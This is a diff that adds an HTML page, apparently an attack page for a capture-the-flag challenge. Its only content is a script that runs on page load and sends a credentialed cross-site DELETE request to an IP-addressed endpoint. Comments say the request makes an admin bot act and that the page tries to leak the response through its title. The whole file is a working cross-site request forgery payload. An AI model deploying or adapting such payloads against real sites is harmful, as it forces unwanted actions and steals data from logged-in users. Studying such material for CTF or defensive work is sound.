@@ -1,0 +1,27 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>prepare</title>
+  <script>
+    async function go() {
+      try {
+        // Trigger admin-bot to delete and serve the flag
+        const r = await fetch('http://34.89.179.154:30331/reach_nirvana', {
+          method: 'DELETE',
+          credentials: 'include'
+        });
+        // If CORS allows, exfil via title; if not, this still triggers the delete
+        const t = await r.text().catch(()=>'(blocked by CORS)');
+        document.title = t;
+      } catch(e) {
+        document.title = 'error';
+      }
+    }
+    window.addEventListener('load', go);
+  </script>
+</head>
+<body>
+  <button>Submit</button>
+</body>
+</html>
